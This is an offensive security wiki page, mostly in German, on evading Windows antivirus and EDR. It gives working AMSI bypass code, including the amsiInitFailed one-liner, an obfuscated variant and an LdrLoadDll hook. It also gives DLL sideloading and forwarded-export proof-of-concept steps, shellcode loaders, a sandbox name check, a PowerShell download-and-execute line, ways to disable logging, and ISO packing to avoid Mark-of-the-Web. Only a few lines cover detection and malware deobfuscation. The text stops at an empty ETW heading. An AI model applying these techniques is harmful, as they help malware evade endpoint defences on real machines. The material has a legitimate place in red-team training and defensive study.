# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Diese Seite wurde geschrieben von** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Defender stoppen

- [defendnot](https://github.com/es3n1n/defendnot): Ein Tool, um Windows Defender funktionsunfähig zu machen.
- [no-defender](https://github.com/es3n1n/no-defender): Ein Tool, um Windows Defender funktionsunfähig zu machen, indem es ein anderes AV vortäuscht.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Derzeit verwenden AVs verschiedene Methoden, um zu prüfen, ob eine Datei bösartig ist oder nicht: static detection, dynamic analysis und bei fortgeschrittenen EDRs behavioural analysis.

### **Static detection**

Static detection wird erreicht, indem bekannte bösartige Strings oder Byte-Arrays in einem Binary oder Script markiert werden und auch Informationen aus der Datei selbst extrahiert werden (z. B. file description, company name, digital signatures, icon, checksum, etc.). Das bedeutet, dass die Verwendung bekannter öffentlicher Tools dich eher auffliegen lässt, da sie wahrscheinlich bereits analysiert und als bösartig markiert wurden. Es gibt einige Möglichkeiten, diese Art der Detection zu umgehen:

- **Verschlüsselung**

Wenn du das Binary verschlüsselst, kann AV dein Programm nicht erkennen, aber du benötigst einen Loader, um es im Speicher zu entschlüsseln und auszuführen.

- **Obfuskation**

Manchmal reicht es, einige Strings im Binary oder Script zu ändern, um an AV vorbeizukommen, aber das kann je nachdem, was du obfuskierst, zeitaufwändig sein.

- **Custom tooling**

Wenn du eigene Tools entwickelst, gibt es keine bekannten schlechten Signaturen, aber das kostet viel Zeit und Aufwand.

> [!TIP]
> Eine gute Möglichkeit, die statische Detection von Windows Defender zu prüfen, ist [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Es teilt die Datei praktisch in mehrere Segmente und veranlasst Defender, jedes einzeln zu scannen; so kann es dir genau sagen, welche Strings oder Bytes in deinem Binary markiert werden.

Ich empfehle dringend, diese [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) über praktische AV Evasion anzusehen.

### **Dynamic analysis**

Dynamic analysis bedeutet, dass AV dein Binary in einer Sandbox ausführt und nach bösartiger Aktivität sucht (z. B. Versuch, Browser-Passwörter zu entschlüsseln und auszulesen, einen minidump von LSASS zu erstellen, etc.). Dieser Teil kann etwas kniffliger sein, aber hier sind einige Dinge, die du tun kannst, um Sandboxes zu umgehen.

- **Sleep before execution** Je nach Implementierung kann das eine gute Methode sein, die dynamic analysis von AVs zu umgehen. AVs haben nur sehr wenig Zeit, Dateien zu scannen, um den Benutzer nicht zu stören, daher können lange Sleeps die Analyse stören. Das Problem ist, dass viele AV-Sandboxes den Sleep einfach überspringen können, je nachdem, wie er implementiert ist.
- **Checking machine's resources** Üblicherweise haben Sandboxes sehr wenig Ressourcen (z. B. < 2GB RAM), sonst würden sie den Rechner des Benutzers verlangsamen. Hier kannst du auch sehr kreativ werden, z. B. indem du die CPU-Temperatur oder sogar die Lüftergeschwindigkeit prüfst — nicht alles ist in der Sandbox implementiert.
- **Machine-specific checks** Wenn du einen Benutzer angreifen willst, dessen Workstation der Domain "contoso.local" beigetreten ist, kannst du die Domain des Computers prüfen; wenn sie nicht übereinstimmt, kann dein Programm sich beenden.

Es stellt sich heraus, dass der Computername der Microsoft Defender Sandbox HAL9TH ist. Du kannst also vor der Detonation den Computernamen in deiner Malware prüfen; wenn der Name HAL9TH ist, befindest du dich in Defender's Sandbox und kannst dein Programm beenden.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>Quelle: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Einige weitere sehr gute Tipps von [@mgeeky](https://twitter.com/mariuszbit) zum Umgang mit Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev Channel</p></figcaption></figure>

Wie bereits in diesem Beitrag gesagt: öffentliche Tools werden schließlich erkannt, also solltest du dir folgende Frage stellen:

Zum Beispiel, wenn du LSASS dumpen willst, musst du wirklich mimikatz verwenden? Oder könntest du ein anderes, weniger bekanntes Projekt nutzen, das ebenfalls LSASS dumpen kann.

Die richtige Antwort ist wahrscheinlich Letzteres. Anhand von mimikatz als Beispiel: Es ist wahrscheinlich eines der, wenn nicht das am häufigsten markierten Malware-Stücke durch AVs und EDRs. Zwar ist das Projekt an sich super, aber es ist auch ein Albtraum, damit AVs zu umgehen — such also nach Alternativen für das, was du erreichen willst.

> [!TIP]
> Wenn du deine Payloads zur Evasion änderst, stelle sicher, dass du die automatische Sample-Übermittlung in Defender deaktivierst, und bitte, ernsthaft, LADE NICHTS ZU VIRUSTOTAL HOCH, wenn dein Ziel langfristige Evasion ist. Wenn du prüfen willst, ob deine Payload von einem bestimmten AV erkannt wird, installiere sie auf einer VM, versuche, die automatische Sample-Übermittlung zu deaktivieren, und teste dort, bis du mit dem Ergebnis zufrieden bist.

## EXEs vs DLLs

Wann immer möglich, priorisiere die Verwendung von DLLs für Evasion. Meiner Erfahrung nach werden DLL-Dateien in der Regel wesentlich seltener erkannt und analysiert, daher ist es ein einfacher Trick, um in manchen Fällen die Erkennung zu vermeiden (vorausgesetzt, deine Payload kann als DLL ausgeführt werden).

Wie man in diesem Bild sehen kann, hat eine DLL-Payload von Havoc eine Erkennungsrate von 4/26 auf antiscan.me, während die EXE-Payload eine Erkennungsrate von 7/26 hat.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Jetzt zeigen wir einige Tricks, die du mit DLL-Dateien verwenden kannst, um deutlich unauffälliger zu sein.

## DLL Sideloading & Proxying

**DLL Sideloading** nutzt die DLL-Suchreihenfolge des Loaders aus, indem die Opferanwendung und die bösartigen Payload(s) nebeneinander platziert werden.

Du kannst Programme, die für DLL Sideloading anfällig sind, mit [Siofra](https://github.com/Cybereason/siofra) und dem folgenden powershell script prüfen:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Dieser Befehl gibt die Liste der Programme aus, die für DLL hijacking innerhalb von "C:\Program Files\\" anfällig sind, sowie die DLL-Dateien, die sie zu laden versuchen.

Ich empfehle dringend, dass du **erkunde DLL Hijackable/Sideloadable programs selbst**, diese Technik ist bei richtiger Anwendung ziemlich unauffällig, aber wenn du öffentlich bekannte DLL Sideloadable programs verwendest, kannst du leicht erwischt werden.

Allein das Platzieren einer bösartige DLL mit dem Namen, den ein Programm zu laden erwartet, führt nicht zur Ausführung deines payloads, da das Programm bestimmte Funktionen in dieser DLL erwartet. Um dieses Problem zu lösen, verwenden wir eine andere Technik namens **DLL Proxying/Forwarding**.

**DLL Proxying** leitet die Aufrufe, die ein Programm an die Proxy-(und bösartige) DLL macht, an die Original-DLL weiter, wodurch die Funktionalität des Programms erhalten bleibt und die Ausführung deines payloads gehandhabt werden kann.

Ich werde das Projekt [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) von [@flangvik](https://twitter.com/Flangvik/) verwenden.

Dies sind die Schritte, die ich befolgt habe:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Der letzte Befehl liefert uns 2 Dateien: eine DLL-Quellcodevorlage und die umbenannte Original-DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Dies sind die Ergebnisse:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowohl unser shellcode (mit [SGN](https://github.com/EgeBalci/sgn) kodiert) als auch die proxy DLL haben eine Erkennungsrate von 0/26 bei [antiscan.me](https://antiscan.me)! Ich würde das als Erfolg bezeichnen.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ich **möchte dringend empfehlen**, dass du dir [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) über DLL Sideloading ansiehst und auch [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE), um mehr über das, was wir ausführlicher besprochen haben, zu erfahren.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE-Module können Funktionen exportieren, die tatsächlich "forwarders" sind: anstatt auf Code zu verweisen, enthält der Exporteintrag einen ASCII-String in der Form `TargetDll.TargetFunc`. Wenn ein Caller den Export auflöst, wird der Windows-Loader:

- `TargetDll` laden, falls es noch nicht geladen ist
- `TargetFunc` daraus auflösen

Wesentliche Verhaltensweisen, die zu verstehen sind:
- Wenn `TargetDll` ein KnownDLL ist, wird es aus dem geschützten KnownDLLs-Namespace bereitgestellt (z. B. ntdll, kernelbase, ole32).
- Wenn `TargetDll` kein KnownDLL ist, wird die normale DLL-Suchreihenfolge verwendet, die das Verzeichnis des Moduls einschließt, das die Weiterleitungsauflösung durchführt.

Das ermöglicht ein indirektes sideloading-Prinzip: finde eine signierte DLL, die eine Funktion exportiert, die an einen Nicht-KnownDLL-Modulnamen weitergeleitet wird, und platziere diese signierte DLL zusammen mit einer vom Angreifer kontrollierten DLL, die genau den weitergeleiteten Zielmodulnamen trägt. Wenn der weitergeleitete Export aufgerufen wird, löst der Loader die Weiterleitung auf und lädt deine DLL aus demselben Verzeichnis, wobei deine DllMain ausgeführt wird.

Beispiel beobachtet unter Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` ist kein KnownDLL, daher wird es über die normale Suchreihenfolge aufgelöst.

PoC (copy-paste):
1) Kopiere die signierte System-DLL in einen beschreibbaren Ordner
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Lege eine bösartige `NCRYPTPROV.dll` in denselben Ordner. Ein minimales DllMain reicht aus, um Codeausführung zu erlangen; du musst die weitergeleitete Funktion nicht implementieren, um DllMain auszulösen.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Lösen Sie die Weiterleitung mit einem signierten LOLBin aus:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Beobachtetes Verhalten:
- rundll32 (signiert) lädt die side-by-side `keyiso.dll` (signiert)
- Beim Auflösen von `KeyIsoSetAuditingInterface` folgt der Loader dem Forward zu `NCRYPTPROV.SetAuditingInterface`
- Der Loader lädt dann `NCRYPTPROV.dll` aus `C:\test` und führt dessen `DllMain` aus
- Wenn `SetAuditingInterface` nicht implementiert ist, erhält man erst nach Ausführung von `DllMain` einen "missing API"-Fehler

Hunting tips:
- Konzentriere dich auf weitergeleitete Exporte, bei denen das Zielmodul kein KnownDLL ist. KnownDLLs sind unter `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` aufgeführt.
- Du kannst weitergeleitete Exporte mit Tools wie:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Siehe das Windows 11 forwarder inventory, um Kandidaten zu suchen: https://hexacorn.com/d/apis_fwd.txt

Erkennungs-/Verteidigungsideen:
- Überwache LOLBins (z. B. rundll32.exe), die signierte DLLs aus Nicht-Systempfaden laden, gefolgt vom Laden von non-KnownDLLs mit demselben Basisnamen aus diesem Verzeichnis
- Alarm bei Prozess-/Modulketten wie: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` unter für Benutzer beschreibbaren Pfaden
- Durchsetzung von Code-Integritätsrichtlinien (WDAC/AppLocker) und Verweigerung von write+execute in Anwendungsverzeichnissen

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Sie können Freeze verwenden, um Ihren shellcode auf eine unauffällige Weise zu laden und auszuführen.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ist nur ein Katz-und-Maus-Spiel: Was heute funktioniert, kann morgen entdeckt werden. Verlasse dich niemals auf nur ein Tool; wenn möglich, versuche mehrere Evasionstechniken zu verketten.

## AMSI (Anti-Malware Scan Interface)

AMSI wurde geschaffen, um "fileless malware" zu verhindern. Ursprünglich konnten AVs nur **Dateien auf der Festplatte** scannen, daher konnte ein Payload, der **direkt im Speicher** ausgeführt wurde, nicht erkannt werden, weil der AV nicht genug Einsicht hatte.

Das AMSI-Feature ist in folgende Windows-Komponenten integriert:

- User Account Control, or UAC (Erhöhung bei EXE-, COM-, MSI- oder ActiveX-Installation)
- PowerShell (Skripte, interaktive Nutzung und dynamische Codeauswertung)
- Windows Script Host (wscript.exe und cscript.exe)
- JavaScript und VBScript
- Office VBA-Makros

Es erlaubt Antivirus-Lösungen, das Verhalten von Skripten zu inspizieren, indem Skriptinhalte in einer Form offengelegt werden, die weder verschlüsselt noch obfuskiert ist.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Beachte, wie es `amsi:` voranstellt und dann den Pfad zur ausführbaren Datei, aus der das Skript lief, in diesem Fall powershell.exe.

Wir haben keine Datei auf die Festplatte geschrieben, wurden aber trotzdem aufgrund von AMSI im Speicher entdeckt.

Außerdem wird seit **.NET 4.8** auch C#-Code durch AMSI geleitet. Das betrifft sogar `Assembly.Load(byte[])` für In-Memory-Loads. Deshalb wird empfohlen, für In-Memory-Ausführung niedrigere .NET-Versionen (z. B. 4.7.2 oder älter) zu verwenden, wenn man AMSI umgehen möchte.

Es gibt ein paar Wege, AMSI zu umgehen:

- **Obfuscation**

Da AMSI hauptsächlich mit statischen Erkennungen arbeitet, kann das Modifizieren der Skripte, die du laden willst, eine gute Möglichkeit sein, die Erkennung zu umgehen.

Allerdings hat AMSI die Fähigkeit, Skripte zu deobfuskieren, selbst wenn mehrere Ebenen vorhanden sind, daher kann Obfuscation je nach Umsetzung eine schlechte Option sein. Das macht das Umgehen nicht so trivial. Manchmal reicht es aber, ein paar Variablennamen zu ändern, und alles ist gut, es hängt also davon ab, wie stark etwas markiert wurde.

- **AMSI Bypass**

Da AMSI implementiert ist, indem eine DLL in den powershell-(auch cscript.exe, wscript.exe, etc.) Prozess geladen wird, ist es möglich, sie selbst als unprivilegierter Benutzer relativ einfach zu manipulieren. Aufgrund dieses Implementierungsfehlers haben Forscher mehrere Wege gefunden, AMSI-Scans zu umgehen.

**Forcing an Error**

Das Erzwingen eines Fehlers bei der AMSI-Initialisierung (amsiInitFailed) führt dazu, dass für den aktuellen Prozess kein Scan gestartet wird. Ursprünglich wurde dies von [Matt Graeber](https://twitter.com/mattifestation) veröffentlicht und Microsoft hat eine Signatur entwickelt, um eine breitere Nutzung zu verhindern.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Alles, was dazu nötig war, war eine einzelne PowerShell-Zeile, um AMSI für den aktuellen PowerShell-Prozess unbrauchbar zu machen. Diese Zeile wurde natürlich von AMSI selbst erkannt, daher sind Modifikationen nötig, um diese Technik verwenden zu können.

Hier ist ein modifizierter AMSI bypass, den ich von diesem [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) übernommen habe.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Beachte, dass dies wahrscheinlich auffallen wird, sobald dieser Beitrag veröffentlicht wird; du solltest daher keinen Code veröffentlichen, wenn dein Plan ist, unentdeckt zu bleiben.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Bitte lies [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) für eine detailliertere Erklärung.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### AMSI blockieren, indem das Laden von amsi.dll verhindert wird (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.

Implementierungsübersicht (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Hinweise
- Funktioniert sowohl mit PowerShell, WScript/CScript als auch mit benutzerdefinierten Loadern (alles, was sonst AMSI laden würde).
- Kombiniert mit dem Einspeisen von Skripten über stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), um lange Kommandozeilen-Artefakte zu vermeiden.
- Wird häufig von Loadern verwendet, die über LOLBins ausgeführt werden (z. B. `regsvr32`, das `DllRegisterServer` aufruft).

Dieses Tool [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) generiert außerdem Skripte, um AMSI zu umgehen.

**Entferne die erkannte Signatur**

Du kannst Tools wie **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** und **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** verwenden, um die erkannte AMSI-Signatur aus dem Speicher des aktuellen Prozesses zu entfernen. Diese Tools scannen den Speicher des aktuellen Prozesses nach der AMSI-Signatur und überschreiben sie dann mit NOP-Instruktionen, wodurch sie effektiv aus dem Speicher entfernt wird.

**AV/EDR-Produkte, die AMSI verwenden**

Eine Liste von AV/EDR-Produkten, die AMSI verwenden, findest du unter **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**PowerShell Version 2 verwenden**
Wenn du PowerShell Version 2 verwendest, wird AMSI nicht geladen, sodass du deine Skripte ausführen kannst, ohne von AMSI gescannt zu werden. Du kannst dies tun:
```bash
powershell.exe -version 2
```
## PS-Protokollierung

PowerShell-Logging ist eine Funktion, mit der Sie alle auf einem System ausgeführten PowerShell-Befehle protokollieren können. Das ist für Audits und Fehlerbehebung nützlich, kann aber auch ein **Problem für Angreifer sein, die der Erkennung entgehen wollen**.

Um PowerShell-Logging zu umgehen, können Sie die folgenden Techniken verwenden:

- **Deaktivieren von PowerShell-Transkription und Modulprotokollierung**: Sie können hierfür ein Tool wie [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) verwenden.
- **Verwenden Sie PowerShell Version 2**: Wenn Sie PowerShell Version 2 verwenden, wird AMSI nicht geladen, sodass Sie Ihre Skripte ausführen können, ohne von AMSI gescannt zu werden. Das geht so: `powershell.exe -version 2`
- **Verwenden Sie eine unmanaged PowerShell-Session**: Nutzen Sie [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), um eine PowerShell ohne Abwehrmechanismen zu starten (das ist das, was `powerpick` von Cobal Strike verwendet).


## Verschleierung

> [!TIP]
> Mehrere Verschleierungstechniken basieren auf der Verschlüsselung von Daten, was die Entropie der Binärdatei erhöht und es AVs und EDRs erleichtert, sie zu erkennen. Seien Sie vorsichtig damit und wenden Sie Verschlüsselung ggf. nur auf spezifische Bereiche Ihres Codes an, die sensibel sind oder verborgen werden müssen.

### Deobfuskation von ConfuserEx-geschützten .NET-Binärdateien

Bei der Analyse von Malware, die ConfuserEx 2 (oder kommerzielle Forks) verwendet, trifft man häufig auf mehrere Schutzschichten, die Decompiler und Sandboxes blockieren. Der untenstehende Workflow stellt zuverlässig ein nahezu originales IL wieder her, das anschließend in Tools wie dnSpy oder ILSpy nach C# dekompiliert werden kann.

1.  Entfernung von Anti-Tampering – ConfuserEx verschlüsselt jeden *method body* und entschlüsselt ihn im statischen Modul-Konstruktor (`<Module>.cctor`). Es wird außerdem die PE-Checksumme gepatcht, sodass jede Änderung die Binärdatei zum Absturz bringen kann. Verwenden Sie **AntiTamperKiller**, um die verschlüsselten Metadatentabellen zu finden, die XOR-Schlüssel wiederherzustellen und eine saubere Assembly neu zu schreiben:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Die Ausgabe enthält die 6 Anti-Tamper-Parameter (`key0-key3`, `nameHash`, `internKey`), die beim Erstellen eines eigenen Unpackers nützlich sein können.

2.  Symbol- / Kontrollfluss-Wiederherstellung – geben Sie die *bereinigte* Datei an **de4dot-cex** (ein ConfuserEx-bewusster Fork von de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – wählt das ConfuserEx 2-Profil  
• de4dot macht Control-Flow-Flattening rückgängig, stellt ursprüngliche Namespaces, Klassen und Variablennamen wieder her und entschlüsselt konstante Strings.

3.  Entfernen von Proxy-Aufrufen – ConfuserEx ersetzt direkte Methodenaufrufe durch leichte Wrapper (sogenannte *proxy calls*), um die Dekompilierung weiter zu erschweren. Entfernen Sie diese mit **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nach diesem Schritt sollten Sie normale .NET-APIs wie `Convert.FromBase64String` oder `AES.Create()` statt undurchsichtiger Wrapperfunktionen (`Class8.smethod_10`, …) sehen.

4.  Manuelle Nachbearbeitung – führen Sie die resultierende Binärdatei in dnSpy aus, suchen Sie nach großen Base64-Blobs oder der Verwendung von `RijndaelManaged`/`TripleDESCryptoServiceProvider`, um das *eigentliche* Payload zu lokalisieren. Häufig speichert die Malware dieses als TLV-kodiertes Byte-Array, initialisiert innerhalb von `<Module>.byte_0`.

Die obige Kette stellt den Ausführungsfluss **wieder her, ohne** das bösartige Sample ausführen zu müssen – nützlich, wenn Sie an einem Offline-Arbeitsplatz arbeiten.

> 🛈  ConfuserEx erzeugt ein benutzerdefiniertes Attribut mit dem Namen `ConfusedByAttribute`, das als IOC verwendet werden kann, um Samples automatisch zu triagieren.

#### Einzeiler
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ziel dieses Projekts ist es, einen Open-Source-Fork der [LLVM](http://www.llvm.org/) Kompilierungs-Suite bereitzustellen, der erhöhte Software-Sicherheit durch [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) und Manipulationsschutz bietet.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstriert, wie man die Sprache `C++11/14` verwendet, um zur Kompilierzeit obfuscated code zu erzeugen, ohne externe Tools zu verwenden und ohne den Compiler zu verändern.
- [**obfy**](https://github.com/fritzone/obfy): Fügt eine Schicht obfuscated operations hinzu, die vom C++ template metaprogramming framework erzeugt wird und das Leben der Person, die versucht, die Anwendung zu knacken, etwas erschwert.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64 binary obfuscator, der verschiedene pe files obfuskieren kann, einschließlich: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ist eine einfache metamorphic code engine für beliebige Executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein feinkörniges code obfuscation framework für LLVM-unterstützte Sprachen, das ROP (return-oriented programming) verwendet. ROPfuscator obfuscates ein Programm auf Assembly-Ebene, indem normale Instruktionen in ROP-Ketten transformiert werden und somit unsere gewohnte Vorstellung von normalem Kontrollfluss unterläuft.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein .NET PE Crypter geschrieben in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kann vorhandene EXE/DLL in shellcode konvertieren und diese dann laden

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Überprüfung des Zone.Identifier ADS für eine aus dem Internet heruntergeladene Datei.</p></figcaption></figure>

> [!TIP]
> Es ist wichtig zu beachten, dass ausführbare Dateien, die mit einem **vertrauenswürdigen** Signaturzertifikat signiert sind, **SmartScreen nicht auslösen**.

A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.

Beispielverwendung:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

